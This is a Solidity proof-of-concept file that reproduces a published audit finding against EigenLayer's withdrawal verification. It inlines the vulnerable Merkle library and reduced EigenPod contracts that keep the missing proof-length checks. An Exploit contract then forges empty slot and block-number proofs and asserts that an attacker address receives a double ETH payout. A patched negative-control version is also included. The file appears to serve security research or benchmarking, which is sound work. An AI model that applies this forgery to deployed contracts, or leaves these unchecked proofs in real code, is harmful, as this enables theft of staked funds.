// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of EigenLayer finding 20056 (Code4rena
// 2023-04, [H-01]): "Slot and block number proofs not required for verification
// of withdrawal (multiple withdrawals possible)".
//
// ROOT CAUSE (verbatim, inlined below):
//   Merkle.processInclusionProofSha256(proof, leaf, index) iterates
//     for (uint256 i = 32; i <= proof.length; i += 32) { ... }
//   With an EMPTY proof (length 0, or any length < 32) the loop body NEVER
//   executes, so the function returns `leaf` UNCHANGED. Hence
//   verifyInclusionSha256("", root, leaf, index) == (leaf == root): an empty
//   proof "verifies" as long as the caller sets leaf == root. There is NO
//   minimum-length gate at the library level.
//
//   BeaconChainProofs.verifyWithdrawalProofs relies on Merkle.verifyInclusionSha256
//   for the slot proof and the block-number proof but does NOT require those two
//   proofs to be non-empty (it requires lengths for the other proofs). An attacker
//   takes a genuinely-valid withdrawal proof and re-creates it with:
//       slotProof        = ""  ; slotRoot        = blockHeaderRoot        (leaf==root)
//       blockNumberProof = ""  ; blockNumberRoot = executionPayloadRoot   (leaf==root)
//   Both empty proofs verify, yet the FORGED slot and block number now differ
//   from the real ones. This defeats BOTH of EigenPod's replay guards:
//     * proofIsForValidBlockNumber(...) — the forged block number is arbitrary,
//     * _processPartialWithdrawal's per-slot "already proven" guard — the forged
//       slot is a DIFFERENT key than the real slot.
//   The same beacon-chain partial withdrawal is therefore processed TWICE →
//   double payout of ETH.
//
// This file inlines the VERBATIM vulnerable Merkle library and Endian library
// from the audited commit (5e48723, github.com/code-423n4/2023-04-eigenlayer),
// plus a faithful REDUCED BeaconChainProofs.verifyWithdrawalProofs and a reduced
// EigenPod.verifyAndProcessWithdrawal that keep the two real replay guards. A
// small REAL sha256 SSZ merkle tree is built so the legitimate full proof
// verifies against a trusted beacon-state root, while the substituted-root empty
// proofs also verify — reproducing the real exploit, not a mock.
//
// Reductions (semantics-preserving; the vulnerable boundary is NEVER mocked):
//   * Tree heights are shrunk (2- and 8-leaf sha256 sub-trees) and container
//     indices are flattened; the sha256 Merkle verification is the REAL one.
//   * _sendETH pays the recipient directly instead of via DelayedWithdrawalRouter
//     (an opaque out-of-scope external boundary).
//   * The full/partial branch is fixed to the partial-withdrawal path (the path
//     the warden's PoC double-spends; the full-withdrawal path is separately
//     blocked by the WITHDRAWN status guard).
// ─────────────────────────────────────────────────────────────────────────────

// ===================== VERBATIM: Endian.sol (audited commit) =====================
library Endian {
    function fromLittleEndianUint64(bytes32 lenum) internal pure returns (uint64 n) {
        // the number needs to be stored in little-endian encoding (ie in bytes 0-8)
        n = uint64(uint256(lenum >> 192));
        return (n >> 56) | ((0x00FF000000000000 & n) >> 40) | ((0x0000FF0000000000 & n) >> 24)
            | ((0x000000FF00000000 & n) >> 8) | ((0x00000000FF000000 & n) << 8) | ((0x0000000000FF0000 & n) << 24)
            | ((0x000000000000FF00 & n) << 40) | ((0x00000000000000FF & n) << 56);
    }
}

// ===================== VERBATIM: Merkle.sol (audited commit) ======================
// Adapted from OpenZeppelin Contracts (utils/cryptography/MerkleProof.sol).
// Byte-identical to src/contracts/libraries/Merkle.sol @ 5e48723 (only the SPDX/
// pragma header and the `// @>` marker comment are added).
library Merkle {
    function verifyInclusionKeccak(bytes memory proof, bytes32 root, bytes32 leaf, uint256 index)
        internal
        pure
        returns (bool)
    {
        return processInclusionProofKeccak(proof, leaf, index) == root;
    }

    function processInclusionProofKeccak(bytes memory proof, bytes32 leaf, uint256 index)
        internal
        pure
        returns (bytes32)
    {
        bytes32 computedHash = leaf;
        for (uint256 i = 32; i <= proof.length; i += 32) {
            if (index % 2 == 0) {
                // if ith bit of index is 0, then computedHash is a left sibling
                assembly {
                    mstore(0x00, computedHash)
                    mstore(0x20, mload(add(proof, i)))
                    computedHash := keccak256(0x00, 0x40)
                    index := div(index, 2)
                }
            } else {
                // if ith bit of index is 1, then computedHash is a right sibling
                assembly {
                    mstore(0x00, mload(add(proof, i)))
                    mstore(0x20, computedHash)
                    computedHash := keccak256(0x00, 0x40)
                    index := div(index, 2)
                }
            }
        }
        return computedHash;
    }

    function verifyInclusionSha256(bytes memory proof, bytes32 root, bytes32 leaf, uint256 index)
        internal
        view
        returns (bool)
    {
        return processInclusionProofSha256(proof, leaf, index) == root;
    }

    function processInclusionProofSha256(bytes memory proof, bytes32 leaf, uint256 index)
        internal
        view
        returns (bytes32)
    {
        bytes32[1] memory computedHash = [leaf];
        for (uint256 i = 32; i <= proof.length; i += 32) { // @> empty/short proof (<32 bytes) skips the loop, returning `leaf` unchanged -> verifyInclusionSha256 == (leaf==root); NO minimum-length gate
            if (index % 2 == 0) {
                // if ith bit of index is 0, then computedHash is a left sibling
                assembly {
                    mstore(0x00, mload(computedHash))
                    mstore(0x20, mload(add(proof, i)))
                    if iszero(staticcall(sub(gas(), 2000), 2, 0x00, 0x40, computedHash, 0x20)) { revert(0, 0) }
                    index := div(index, 2)
                }
            } else {
                // if ith bit of index is 1, then computedHash is a right sibling
                assembly {
                    mstore(0x00, mload(add(proof, i)))
                    mstore(0x20, mload(computedHash))
                    if iszero(staticcall(sub(gas(), 2000), 2, 0x00, 0x40, computedHash, 0x20)) { revert(0, 0) }
                    index := div(index, 2)
                }
            }
        }
        return computedHash[0];
    }

    function merkleizeSha256(bytes32[] memory leaves) internal pure returns (bytes32) {
        //there are half as many nodes in the layer above the leaves
        uint256 numNodesInLayer = leaves.length / 2;
        //create a layer to store the internal nodes
        bytes32[] memory layer = new bytes32[](numNodesInLayer);
        //fill the layer with the pairwise hashes of the leaves
        for (uint256 i = 0; i < numNodesInLayer; i++) {
            layer[i] = sha256(abi.encodePacked(leaves[2 * i], leaves[2 * i + 1]));
        }
        //the next layer above has half as many nodes
        numNodesInLayer /= 2;
        //while we haven't computed the root
        while (numNodesInLayer != 0) {
            //overwrite the first numNodesInLayer nodes in layer with the pairwise hashes of their children
            for (uint256 i = 0; i < numNodesInLayer; i++) {
                layer[i] = sha256(abi.encodePacked(layer[2 * i], layer[2 * i + 1]));
            }
            //the next layer above has half as many nodes
            numNodesInLayer /= 2;
        }
        //the first node in the layer is the root
        return layer[0];
    }
}

// ================= REDUCED (faithful): BeaconChainProofs.verifyWithdrawalProofs ==================
// Mirrors the audited verifyWithdrawalProofs: length `require`s exist for the
// block-header / execution-payload / withdrawal proofs, but — exactly as in the
// audited code — there is NO length `require` for slotProof or blockNumberProof.
// Container indices/heights are reduced; the sha256 verification is the real one.
library BeaconChainProofs {
    // in beacon block header (reduced flat tree, height 3)
    uint256 internal constant SLOT_INDEX = 0;
    uint256 internal constant EXECUTION_PAYLOAD_LEAF_INDEX = 1;
    // in execution payload (reduced flat tree, height 3)
    uint256 internal constant BLOCK_NUMBER_INDEX = 6;
    uint256 internal constant WITHDRAWAL_LEAF_INDEX = 0;
    // reduced proof lengths (bytes)
    uint256 internal constant BLOCK_HEADER_PROOF_LEN = 32; // beaconState tree height 1
    uint256 internal constant EXEC_PAYLOAD_PROOF_LEN = 96; // header tree height 3
    uint256 internal constant WITHDRAWAL_PROOF_LEN = 96; // exec tree height 3

    struct WithdrawalProofs {
        bytes blockHeaderProof;
        bytes withdrawalProof;
        bytes slotProof;
        bytes executionPayloadProof;
        bytes blockNumberProof;
        uint64 blockHeaderRootIndex;
        uint64 withdrawalIndex;
        bytes32 blockHeaderRoot;
        bytes32 blockBodyRoot;
        bytes32 slotRoot;
        bytes32 blockNumberRoot;
        bytes32 executionPayloadRoot;
    }

    function verifyWithdrawalProofs(
        bytes32 beaconStateRoot,
        WithdrawalProofs memory proofs,
        bytes32[] memory withdrawalFields
    ) internal view {
        require(withdrawalFields.length == 4, "verifyWithdrawalProofs: withdrawalFields has incorrect length");

        // length gates for the OTHER proofs (present in the audited source)
        require(proofs.blockHeaderProof.length == BLOCK_HEADER_PROOF_LEN, "blockHeaderProof has incorrect length");
        require(
            proofs.executionPayloadProof.length == EXEC_PAYLOAD_PROOF_LEN, "executionPayloadProof has incorrect length"
        );
        require(proofs.withdrawalProof.length == WITHDRAWAL_PROOF_LEN, "withdrawalProof has incorrect length");
        // @> BUG: the audited code has NO `require(proofs.slotProof.length ...)` and NO
        // @> `require(proofs.blockNumberProof.length ...)`. Empty slot/blockNumber proofs
        // @> therefore pass Merkle.verifyInclusionSha256 whenever leaf == root.

        // 1) Anchor blockHeaderRoot to the trusted beaconStateRoot (oracle-provided).
        require(
            Merkle.verifyInclusionSha256(
                proofs.blockHeaderProof, beaconStateRoot, proofs.blockHeaderRoot, uint256(proofs.blockHeaderRootIndex)
            ),
            "Invalid block header merkle proof"
        );

        // 2) slotRoot against blockHeaderRoot  (FORGEABLE: no length gate)
        require(
            Merkle.verifyInclusionSha256(proofs.slotProof, proofs.blockHeaderRoot, proofs.slotRoot, SLOT_INDEX),
            "Invalid slot merkle proof"
        );

        // 3) executionPayloadRoot against blockHeaderRoot (anchored, genuine)
        require(
            Merkle.verifyInclusionSha256(
                proofs.executionPayloadProof,
                proofs.blockHeaderRoot,
                proofs.executionPayloadRoot,
                EXECUTION_PAYLOAD_LEAF_INDEX
            ),
            "Invalid executionPayload merkle proof"
        );

        // 4) blockNumberRoot against executionPayloadRoot  (FORGEABLE: no length gate)
        require(
            Merkle.verifyInclusionSha256(
                proofs.blockNumberProof, proofs.executionPayloadRoot, proofs.blockNumberRoot, BLOCK_NUMBER_INDEX
            ),
            "Invalid blockNumber merkle proof"
        );

        // 5) withdrawalRoot (amount) against executionPayloadRoot (anchored, genuine)
        bytes32 withdrawalRoot = Merkle.merkleizeSha256(withdrawalFields);
        require(
            Merkle.verifyInclusionSha256(
                proofs.withdrawalProof, proofs.executionPayloadRoot, withdrawalRoot, uint256(proofs.withdrawalIndex)
            ),
            "Invalid withdrawal merkle proof"
        );
    }
}

// ================= FIXED (negative control): adds the recommended length gates ==================
library BeaconChainProofsFixed {
    function verifyWithdrawalProofs(
        bytes32 beaconStateRoot,
        BeaconChainProofs.WithdrawalProofs memory proofs,
        bytes32[] memory withdrawalFields
    ) internal view {
        require(withdrawalFields.length == 4, "verifyWithdrawalProofs: withdrawalFields has incorrect length");
        require(
            proofs.blockHeaderProof.length == BeaconChainProofs.BLOCK_HEADER_PROOF_LEN,
            "blockHeaderProof has incorrect length"
        );
        require(
            proofs.executionPayloadProof.length == BeaconChainProofs.EXEC_PAYLOAD_PROOF_LEN,
            "executionPayloadProof has incorrect length"
        );
        require(
            proofs.withdrawalProof.length == BeaconChainProofs.WITHDRAWAL_PROOF_LEN, "withdrawalProof has incorrect length"
        );
        // FIX (recommended mitigation): require non-empty slot & block-number proofs.
        require(proofs.slotProof.length >= 32, "slotProof has incorrect length");
        require(proofs.blockNumberProof.length >= 32, "blockNumberProof has incorrect length");

        require(
            Merkle.verifyInclusionSha256(
                proofs.blockHeaderProof, beaconStateRoot, proofs.blockHeaderRoot, uint256(proofs.blockHeaderRootIndex)
            ),
            "Invalid block header merkle proof"
        );
        require(
            Merkle.verifyInclusionSha256(
                proofs.slotProof, proofs.blockHeaderRoot, proofs.slotRoot, BeaconChainProofs.SLOT_INDEX
            ),
            "Invalid slot merkle proof"
        );
        require(
            Merkle.verifyInclusionSha256(
                proofs.executionPayloadProof,
                proofs.blockHeaderRoot,
                proofs.executionPayloadRoot,
                BeaconChainProofs.EXECUTION_PAYLOAD_LEAF_INDEX
            ),
            "Invalid executionPayload merkle proof"
        );
        require(
            Merkle.verifyInclusionSha256(
                proofs.blockNumberProof,
                proofs.executionPayloadRoot,
                proofs.blockNumberRoot,
                BeaconChainProofs.BLOCK_NUMBER_INDEX
            ),
            "Invalid blockNumber merkle proof"
        );
        bytes32 withdrawalRoot = Merkle.merkleizeSha256(withdrawalFields);
        require(
            Merkle.verifyInclusionSha256(
                proofs.withdrawalProof, proofs.executionPayloadRoot, withdrawalRoot, uint256(proofs.withdrawalIndex)
            ),
            "Invalid withdrawal merkle proof"
        );
    }
}

// ================= REDUCED (faithful): EigenPod.verifyAndProcessWithdrawal =======================
// Keeps BOTH real replay guards:
//   * proofIsForValidBlockNumber(blockNumber) — block number must be newer.
//   * _processPartialWithdrawal's per-slot "already proven" guard — slot used once.
// _sendETH pays the recipient directly (router reduced away).
contract EigenPod {
    uint256 internal constant GWEI_TO_WEI = 1e9;

    bytes32 public immutable beaconStateRoot; // trusted, oracle-provided
    address public podOwner; // recipient of withdrawals (the attacker in this PoC)
    uint64 public mostRecentWithdrawalBlockNumber;

    // validatorIndex => slot => already proven?
    mapping(uint40 => mapping(uint64 => bool)) public provenPartialWithdrawal;

    constructor(bytes32 _beaconStateRoot, address _podOwner) {
        beaconStateRoot = _beaconStateRoot;
        podOwner = _podOwner;
    }

    receive() external payable {}

    modifier proofIsForValidBlockNumber(uint64 blockNumber) {
        require(
            blockNumber > mostRecentWithdrawalBlockNumber,
            "proofIsForValidBlockNumber: beacon chain proof must be for block number after mostRecentWithdrawalBlockNumber"
        );
        _;
    }

    function verifyAndProcessWithdrawal(
        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs,
        bytes32[] memory withdrawalFields
    ) external proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot)) {
        // Verify the withdrawal (incl. slot & block number) against the trusted root.
        BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, withdrawalProofs, withdrawalFields);

        uint40 validatorIndex = uint40(Endian.fromLittleEndianUint64(withdrawalFields[1]));
        uint64 withdrawalAmountGwei = Endian.fromLittleEndianUint64(withdrawalFields[3]);
        uint64 slot = Endian.fromLittleEndianUint64(withdrawalProofs.slotRoot);

        _processPartialWithdrawal(slot, withdrawalAmountGwei, validatorIndex, podOwner);
    }

    function _processPartialWithdrawal(
        uint64 withdrawalHappenedSlot,
        uint64 partialWithdrawalAmountGwei,
        uint40 validatorIndex,
        address recipient
    ) internal {
        require(
            !provenPartialWithdrawal[validatorIndex][withdrawalHappenedSlot],
            "_processPartialWithdrawal: partial withdrawal has already been proven for this slot"
        );
        provenPartialWithdrawal[validatorIndex][withdrawalHappenedSlot] = true;
        (bool ok,) = recipient.call{value: uint256(partialWithdrawalAmountGwei) * GWEI_TO_WEI}("");
        require(ok, "eth send failed");
    }
}

// FIXED pod: identical, but routes verification through the length-gated library.
contract EigenPodFixed {
    uint256 internal constant GWEI_TO_WEI = 1e9;

    bytes32 public immutable beaconStateRoot;
    address public podOwner;
    uint64 public mostRecentWithdrawalBlockNumber;
    mapping(uint40 => mapping(uint64 => bool)) public provenPartialWithdrawal;

    constructor(bytes32 _beaconStateRoot, address _podOwner) {
        beaconStateRoot = _beaconStateRoot;
        podOwner = _podOwner;
    }

    receive() external payable {}

    modifier proofIsForValidBlockNumber(uint64 blockNumber) {
        require(
            blockNumber > mostRecentWithdrawalBlockNumber,
            "proofIsForValidBlockNumber: beacon chain proof must be for block number after mostRecentWithdrawalBlockNumber"
        );
        _;
    }

    function verifyAndProcessWithdrawal(
        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs,
        bytes32[] memory withdrawalFields
    ) external proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot)) {
        BeaconChainProofsFixed.verifyWithdrawalProofs(beaconStateRoot, withdrawalProofs, withdrawalFields);

        uint40 validatorIndex = uint40(Endian.fromLittleEndianUint64(withdrawalFields[1]));
        uint64 withdrawalAmountGwei = Endian.fromLittleEndianUint64(withdrawalFields[3]);
        uint64 slot = Endian.fromLittleEndianUint64(withdrawalProofs.slotRoot);

        require(
            !provenPartialWithdrawal[validatorIndex][slot],
            "_processPartialWithdrawal: partial withdrawal has already been proven for this slot"
        );
        provenPartialWithdrawal[validatorIndex][slot] = true;
        (bool ok,) = podOwner.call{value: uint256(withdrawalAmountGwei) * GWEI_TO_WEI}("");
        require(ok, "eth send failed");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit: builds a REAL sha256 SSZ merkle tree, deploys the reduced pod, and
// double-processes a single 1-ETH partial withdrawal by substituting empty
// slot/blockNumber proofs. Both illegitimate payouts go to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // Distinct owner for the FIXED pod so its (legitimate) payout never pollutes
    // the attacker-balance harm measurement on the vulnerable pod.
    address internal constant CONTROL = 0x000000000000000000000000000000000000c011;

    uint64 internal constant AMOUNT_GWEI = 1_000_000_000; // 1 ETH worth of gwei
    uint256 public constant AMOUNT_WEI = uint256(AMOUNT_GWEI) * 1e9; // 1 ETH
    uint40 internal constant VALIDATOR_INDEX = 12345;
    uint64 internal constant SLOT_REAL = 43222;
    uint64 internal constant BLOCKNUM_REAL = 2262;

    // Fillers so sub-tree leaves are distinct (any distinct constants work).
    bytes32 internal constant F = bytes32(uint256(0xf11e40));

    EigenPod public pod;
    EigenPodFixed public podFixed;

    // Built proof material.
    BeaconChainProofs.WithdrawalProofs internal genuine;
    BeaconChainProofs.WithdrawalProofs internal forged;
    bytes32[] internal wf;
    bytes32 public beaconStateRoot;
    bytes32 public blockHeaderRoot;
    bytes32 public executionPayloadRoot;

    // Results (asserted by the driver).
    uint256 public totalPaidToAttacker; // 2 * AMOUNT_WEI on the vulnerable pod
    uint256 public stolenWei; // the illegitimate second payout
    uint64 public slotReal;
    uint64 public slotForged;
    bool public genuineReplayReverted; // guard B blocks an exact replay
    bool public fixedBlockedForged; // length gate blocks the empty-proof forgery

    constructor() {
        _buildTree();
        pod = new EigenPod(beaconStateRoot, ATTACKER);
        podFixed = new EigenPodFixed(beaconStateRoot, CONTROL);
    }

    // --- little-endian encode a uint64 into the top 8 bytes of a bytes32 ---
    function _le(uint64 v) internal pure returns (bytes32 out) {
        for (uint256 i = 0; i < 8; i++) {
            out |= bytes32(uint256(uint256(uint8(v >> (8 * i))) << ((31 - i) * 8)));
        }
    }

    // --- compute the merkle root AND the sibling proof for `index` (real sha256) ---
    function _proofAndRoot(bytes32[] memory leaves, uint256 index)
        internal
        view
        returns (bytes memory proof, bytes32 root)
    {
        proof = "";
        uint256 idx = index;
        bytes32[] memory layer = leaves;
        while (layer.length > 1) {
            proof = abi.encodePacked(proof, layer[idx ^ 1]);
            bytes32[] memory next = new bytes32[](layer.length / 2);
            for (uint256 i = 0; i < next.length; i++) {
                next[i] = sha256(abi.encodePacked(layer[2 * i], layer[2 * i + 1]));
            }
            layer = next;
            idx = idx / 2;
        }
        root = layer[0];
    }

    function _buildTree() internal {
        // withdrawal container: [_, validatorIndex, _, amount]
        wf = new bytes32[](4);
        wf[0] = F;
        wf[1] = _le(uint64(VALIDATOR_INDEX));
        wf[2] = F;
        wf[3] = _le(AMOUNT_GWEI);
        bytes32 withdrawalRoot = Merkle.merkleizeSha256(wf);

        bytes32 slotRoot = _le(SLOT_REAL);
        bytes32 blockNumberRoot = _le(BLOCKNUM_REAL);

        // execution payload tree (8 leaves): [withdrawalRoot, _, _, _, _, _, blockNumberRoot, _]
        bytes32[] memory execLeaves = new bytes32[](8);
        execLeaves[BeaconChainProofs.WITHDRAWAL_LEAF_INDEX] = withdrawalRoot; // idx 0
        execLeaves[1] = bytes32(uint256(1));
        execLeaves[2] = bytes32(uint256(2));
        execLeaves[3] = bytes32(uint256(3));
        execLeaves[4] = bytes32(uint256(4));
        execLeaves[5] = bytes32(uint256(5));
        execLeaves[BeaconChainProofs.BLOCK_NUMBER_INDEX] = blockNumberRoot; // idx 6
        execLeaves[7] = bytes32(uint256(7));
        (bytes memory blockNumberProof, bytes32 execRoot) =
            _proofAndRoot(execLeaves, BeaconChainProofs.BLOCK_NUMBER_INDEX);
        (bytes memory withdrawalProof,) = _proofAndRoot(execLeaves, BeaconChainProofs.WITHDRAWAL_LEAF_INDEX);
        executionPayloadRoot = execRoot;

        // block header tree (8 leaves): [slotRoot, executionPayloadRoot, ...fillers]
        bytes32[] memory headerLeaves = new bytes32[](8);
        headerLeaves[BeaconChainProofs.SLOT_INDEX] = slotRoot; // idx 0
        headerLeaves[BeaconChainProofs.EXECUTION_PAYLOAD_LEAF_INDEX] = execRoot; // idx 1
        headerLeaves[2] = bytes32(uint256(0x22));
        headerLeaves[3] = bytes32(uint256(0x33));
        headerLeaves[4] = bytes32(uint256(0x44));
        headerLeaves[5] = bytes32(uint256(0x55));
        headerLeaves[6] = bytes32(uint256(0x66));
        headerLeaves[7] = bytes32(uint256(0x77));
        (bytes memory slotProof, bytes32 headerRoot) = _proofAndRoot(headerLeaves, BeaconChainProofs.SLOT_INDEX);
        (bytes memory executionPayloadProof,) =
            _proofAndRoot(headerLeaves, BeaconChainProofs.EXECUTION_PAYLOAD_LEAF_INDEX);
        blockHeaderRoot = headerRoot;

        // beacon state tree (2 leaves): [blockHeaderRoot, filler] -> trusted root
        bytes32[] memory stateLeaves = new bytes32[](2);
        stateLeaves[0] = headerRoot;
        stateLeaves[1] = F;
        (bytes memory blockHeaderProof, bytes32 stateRoot) = _proofAndRoot(stateLeaves, 0);
        beaconStateRoot = stateRoot;

        // ---- genuine (fully valid) withdrawal proof set ----
        genuine.blockHeaderProof = blockHeaderProof;
        genuine.withdrawalProof = withdrawalProof;
        genuine.slotProof = slotProof;
        genuine.executionPayloadProof = executionPayloadProof;
        genuine.blockNumberProof = blockNumberProof;
        genuine.blockHeaderRootIndex = 0;
        genuine.withdrawalIndex = uint64(BeaconChainProofs.WITHDRAWAL_LEAF_INDEX);
        genuine.blockHeaderRoot = headerRoot;
        genuine.blockBodyRoot = F;
        genuine.slotRoot = slotRoot;
        genuine.blockNumberRoot = blockNumberRoot;
        genuine.executionPayloadRoot = execRoot;

        // ---- forged: empty slot & blockNumber proofs, leaf substituted for root ----
        forged = genuine;
        forged.slotProof = bytes(""); // empty -> Merkle loop skipped
        forged.slotRoot = headerRoot; // leaf == root  => verifies
        forged.blockNumberProof = bytes(""); // empty -> Merkle loop skipped
        forged.blockNumberRoot = execRoot; // leaf == root  => verifies

        slotReal = Endian.fromLittleEndianUint64(slotRoot);
        slotForged = Endian.fromLittleEndianUint64(headerRoot);
    }

    // Views so the driver (and the Playground) can reuse the built proof material.
    function genuineProofs() external view returns (BeaconChainProofs.WithdrawalProofs memory) {
        return genuine;
    }

    function forgedProofs() external view returns (BeaconChainProofs.WithdrawalProofs memory) {
        return forged;
    }

    function withdrawalFieldsView() external view returns (bytes32[] memory) {
        return wf;
    }

    function run() external payable {
        // 2 ETH backs the vulnerable pod (double payout) + 1 ETH for the fixed-pod control.
        require(msg.value >= 3 * AMOUNT_WEI, "fund the pod");
        // Fund the vulnerable pod with 2 ETH (backs its accounting).
        (bool f,) = address(pod).call{value: 2 * AMOUNT_WEI}("");
        require(f, "fund pod");

        uint256 before = ATTACKER.balance;

        // (1) Legitimate partial withdrawal — pays the real 1 ETH, marks slot S_real.
        pod.verifyAndProcessWithdrawal(genuine, wf);
        uint256 afterFirst = ATTACKER.balance;
        require(afterFirst - before == AMOUNT_WEI, "first (genuine) payout");

        // (2) Guard B is real: replaying the EXACT genuine proof is blocked (slot reused).
        try pod.verifyAndProcessWithdrawal(genuine, wf) {
            genuineReplayReverted = false;
        } catch {
            genuineReplayReverted = true;
        }
        require(genuineReplayReverted, "guard B should block exact replay");
        require(ATTACKER.balance == afterFirst, "no payout on blocked replay");

        // (3) Forge slot & block number via EMPTY proofs -> different slot key ->
        //     guard B bypassed -> the SAME withdrawal is processed a SECOND time.
        require(slotForged != slotReal, "forged slot must differ");
        pod.verifyAndProcessWithdrawal(forged, wf);
        uint256 afterSecond = ATTACKER.balance;

        stolenWei = afterSecond - afterFirst; // illegitimate second payout
        totalPaidToAttacker = afterSecond - before;
        require(totalPaidToAttacker == 2 * AMOUNT_WEI, "double payout not achieved");
        require(stolenWei == AMOUNT_WEI, "stolen == one extra withdrawal");

        // (4) Negative control: the length-gated FIXED pod rejects the empty-proof forgery.
        (bool ff,) = address(podFixed).call{value: AMOUNT_WEI}("");
        require(ff, "fund fixed pod");
        podFixed.verifyAndProcessWithdrawal(genuine, wf); // genuine still works
        try podFixed.verifyAndProcessWithdrawal(forged, wf) {
            fixedBlockedForged = false;
        } catch {
            fixedBlockedForged = true;
        }
        require(fixedBlockedForged, "fixed pod must reject empty-proof forgery");
    }
}
